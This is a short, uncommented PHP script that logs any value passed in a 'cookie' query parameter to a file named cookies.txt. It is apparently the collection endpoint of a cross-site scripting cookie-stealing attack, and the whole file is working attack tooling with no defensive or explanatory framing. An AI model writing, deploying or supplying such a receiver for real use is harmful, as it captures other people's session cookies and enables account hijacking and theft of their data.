<?php
if (isset($_GET['cookie']))
{
	$file = 'cookies.txt';
	file_put_contents($file, $_GET['cookie'].PHP_EOL, FILE_APPEND);
}

?>
